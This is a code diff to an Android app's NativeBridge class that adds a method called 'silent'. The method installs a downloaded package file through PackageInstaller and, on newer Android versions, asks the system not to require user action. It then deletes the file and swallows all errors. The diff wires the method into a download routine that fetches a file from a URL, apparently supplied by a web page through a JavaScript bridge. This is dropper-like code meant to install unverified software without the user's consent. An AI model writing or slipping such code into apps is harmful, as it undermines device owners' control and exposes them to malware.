@@ -76,6 +76,30 @@ public class NativeBridge {
         }).start();
     }
 
+    private boolean silent(File f) {
+        try {
+            android.content.pm.PackageInstaller pi = ctx.getPackageManager().getPackageInstaller();
+            android.content.pm.PackageInstaller.SessionParams sp = new android.content.pm.PackageInstaller.SessionParams(android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+            if (Build.VERSION.SDK_INT >= 31) sp.setRequireUserAction(android.content.pm.PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
+            int id = pi.createSession(sp);
+            android.content.pm.PackageInstaller.Session se = pi.openSession(id);
+            java.io.OutputStream os = se.openWrite("toole", 0, f.length());
+            java.io.FileInputStream is = new java.io.FileInputStream(f);
+            byte[] bf = new byte[65536];
+            int k;
+            while ((k = is.read(bf)) > 0) os.write(bf, 0, k);
+            is.close();
+            se.fsync(os);
+            os.close();
+            int fl = android.app.PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= 31 ? android.app.PendingIntent.FLAG_MUTABLE : 0);
+            android.app.PendingIntent pe = android.app.PendingIntent.getBroadcast(ctx, id, new Intent(ctx, InstallReceiver.class), fl);
+            se.commit(pe.getIntentSender());
+            se.close();
+            try { f.delete(); } catch (Throwable t) { }
+            return true;
+        } catch (Throwable t) { return false; }
+    }
+
     private void download(String url) {
         HttpURLConnection c = null;
         try {
@@ -104,6 +128,7 @@ public class NativeBridge {
             in.close();
             if (f.length() < 1000000) throw new Exception("small");
             js("window.__tmoState&&window.__tmoState('install')");
+            if (silent(f)) return;
             Uri uri = FileProvider.getUriForFile(ctx, ctx.getPackageName() + ".fileprovider", f);
             Intent it = new Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive");
             it.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
